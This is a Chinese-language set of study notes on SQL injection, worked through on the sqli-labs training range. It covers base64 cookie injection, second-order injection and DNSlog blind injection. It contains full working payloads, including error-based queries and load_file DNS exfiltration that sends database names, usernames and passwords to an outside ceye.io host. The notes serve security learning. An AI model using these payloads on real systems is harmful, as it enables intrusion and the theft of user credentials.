# 1、编解码注入

## 靶场 sqlilabs-Less21

<img src="https://s2.loli.net/2022/11/25/Xz3PMJm9xUsl5w1.png" alt="image-20221114185737491" style="zoom: 25%;" />

登录后，使用bp抓包

<img src="https://s2.loli.net/2022/11/25/Ihwj6la1V3KYWun.png" alt="image-20221114185838598" style="zoom: 50%;" />



分析源码：

![image-20221114190027008](https://s2.loli.net/2022/11/25/wVyuUC4zsKBSleQ.png)

发现，如果正确登录，就会设置一个cookie，并且使用base64编码

分析cookie：

![image-20221114190506222](https://s2.loli.net/2022/11/25/P2V4DhOaTtxlMIs.png)

发现此处可以进行cookie注入，但要注意，cookie经过base64编码



所以，抓到一个有cookie的包，

<img src="https://s2.loli.net/2022/11/25/3aWnNlcDUd8P7iH.png" alt="image-20221114190153008" style="zoom: 50%;" />



**%3D** 的urldecode值为 **=** 

将YWRtaW4= 进行 base64解码得 ： admin



**cookie编码注入：**

```
admin') and 1=1 #
编码得：
YWRtaW4nKSBhbmQgMT0xICM=
```

发送数据包：

<img src="https://s2.loli.net/2022/11/25/IYMvpxmLwChkOPF.png" alt="image-20221114191352558" style="zoom:33%;" />



```
') or updatexml(0,concat(0x7e,database()),0) #				cookie报错注入
编码：
Jykgb3IgdXBkYXRleG1sKDAsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSksMCkgIw==
```

<img src="https://s2.loli.net/2022/11/25/I4SA9cbEyCk65xh.png" alt="image-20221114191637057" style="zoom: 33%;" />



# 2、二次注入

![img](https://s2.loli.net/2022/11/25/nsykzIebFcwavuh.webp)



## 1、什么是二次注入

简单的说，二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入。

网站对我们输入的一些重要的关键字进行了转义，但是这些我们构造的语句已经写进了数据库，可以在没有被转义的地方使用

可能每一次注入都不构成漏洞，但是如果一起用就可能造成注入。

 

**普通注入与二次注入的区别：**



- ```
  普通注入：
  
  - 在http后面构造语句，是立即直接生效的
  - 一次注入很容易被扫描工具扫描到
  
   
  
  二次注入：
  
  - 先构造语句（有被转义字符的语句）
  
  - 我们构造的恶意语句存入数据库
  
  - 第二次构造语句（结合前面已经存入数据库的语句，成功。因为系统没有对已经存入数据库的数据做检查）
  
  - 二次注入更加难以被发现
  
     
  ```



## 2、二次注入原理

二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。



**二次注入的原理，主要分为两步**：



**第一步：插入恶意数据**

第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。

**第二部：引入恶意数据**

在将数据存入到了数据库中之后，开发者就认为数据是可信的。早下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。



**二次注入示例：**

***寻找插入数据库，并会转义的操作\***

输入参数1' -->参数经过转义函数1\‘ -->参数进入数据库还原为1’

***寻找另一处引用这个数据的操作\***

将1‘从数据库中取出-->取出后直接给变量并带入SQL-->SQL注入触发



```
应用场景---

在前端和URL（黑盒测试）是无法发现二次注入，无法用工具扫描，只有在代码审计时才能发现是否存在二次注入 
```



## sqlilabs-Less24



1、尝试在注册页面插入恶意数据，我们先注册一个账号，用户名为：admin'#，密码为123456。

<img src="https://s2.loli.net/2022/11/25/92lxNt3j5GLzWd7.png" alt="image-20221114192429865" style="zoom:33%;" />



2、查看恶意数据是否成功写入数据库

这是因为当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反斜杠。

<img src="https://s2.loli.net/2022/11/25/57ZKdLxorA2qzHk.png" alt="image-20221114192600792" style="zoom:33%;" />



```
而这时的admin原密码是admin，并且两个账号都存储在数据库内的。当我们重新修改admin'#的密码时，这里修改为12345678；可以发现admin的密码却被修改为了xxxxxxx；而admin'#用户的密码并没有发生变化。
```

<img src="https://s2.loli.net/2022/11/25/WbpZgsfIc1o3d9L.png" alt="image-20221114192807802" style="zoom:33%;" />

<img src="https://s2.loli.net/2022/11/25/CKkEy4wtBlVbR5a.png" alt="image-20221114192852917" style="zoom:33%;" />

源码分析：

![image-20221114193053603](https://s2.loli.net/2022/11/25/wA9fuyZenavQmGO.png)



```
update users set password='xxxxxxx' where username='admin' #' and password='123456'
用户名为： admin' #  相当于把语句的后半部分给注释掉了，把用户名为admin的密码给改了
相当于：
update users set password='xxxxxxx' where username='admin'
```



这就是二次注入



# 3、DNSlog盲注



**1.DNS**

DNS(Domain Name System，域名系统)，因特网上作为域名和[IP地址](https://baike.so.com/doc/4252723-4455111.html)相互映射的一个[分布式数据库](https://baike.so.com/doc/6591740-6805519.html)，能够使用户更方便的访问[互联网](https://baike.so.com/doc/2011565-2128705.html)，而不用去记住能够被机器直接读取的IP数串。通过[主机](https://baike.so.com/doc/5331327-5566564.html)名，最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析)。DNS协议运行在[UDP](https://baike.so.com/doc/5418284-5656447.html)协议之上，使用端口号53。在RFC文档中RFC 2181对DNS有规范说明，RFC 2136对DNS的动态更新进行说明，RFC 2308对DNS查询的反向缓存进行说明。



**2.Dnslog**

Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名`www.test.com`、`t00ls.com.`等的访问信息。



**DnsLog盲注**

对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，Dnslog盲注可以减少发送的请求，直接回显数据实现注入 使用DnsLog盲注仅限于windos环境。



**原理图:**

![img](https://s2.loli.net/2022/11/25/M4nyYGNruzUdK9q.png)

 

如图，攻击者首先提交注入语句select load_file(concat('\\\\','攻击语句',.XXX.ceye.io\\abc))

在数据库中攻击语句被执行，由**`concat`**函数将执行结果与**`XXX.ceye.io\\abc`**拼接，构成一个新的域名，而mysql中的**`select load_file()`**可以发起请求，那么这一条带有数据库查询结果的域名就被提交到DNS服务器进行解析

此时，如果我们可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。那么我们如何获得这条DNS查询记录呢？注意注入语句中的**`ceye.io`**，这其实是一个开放的Dnslog平台（具体用法在官网可见），在[http://ceye.io](http://ceye.io/)上我们可以获取到有关`ceye.io`的DNS查询信息。实际上在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在`ceye.io`时，它会将这条域名信息转到相应的NS服务器上，而通过[http://ceye.io](http://ceye.io/)我们就可以查询到这条DNS解析记录。

 

**构造语法**

构造语句，利用load_file()函数发起请求，使用Dnslog接受请求，获取数据

```
SELECT LOAD_FILE(CONCAT('\\\',(select database(),'mysql.cmr1ua.ceye.io\\abc')))
```

通过SQL语句查询内容，作为请求的一部分发送至Dnslog

只要对这一部分语句进行构造，就能实现有回显的SQL注入

**payload:**

**获取数据库名**

```
http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select database()),'.cmr1ua.ceye.io\\abc'))--+
```

 通过dnslog查看到数据名为security

![img](https://s2.loli.net/2022/11/25/joIOd8LWDfbXeFN.png)

 **获取数据表**

```
http://127.0.0.1/lou/sql/Less-9/?id=1' and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
```

**获取表中的字段名**

```
' and load_file(concat('\\\\',(select column_name from information_schema.columns where table_name='users' limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
```

**获取表中字段下的数据**

```
' and load_file(concat('\\\\',(select password from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
' and load_file(concat('\\\\',(select username from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
```

因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 出来了再转回去

```
' and load_file(concat('\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.cmr1ua.ceye.io\\abc'))--+
```

参考资料：https://www.cnblogs.com/xhds/p/12322839.html



# 4、中转注入



编写php脚本，



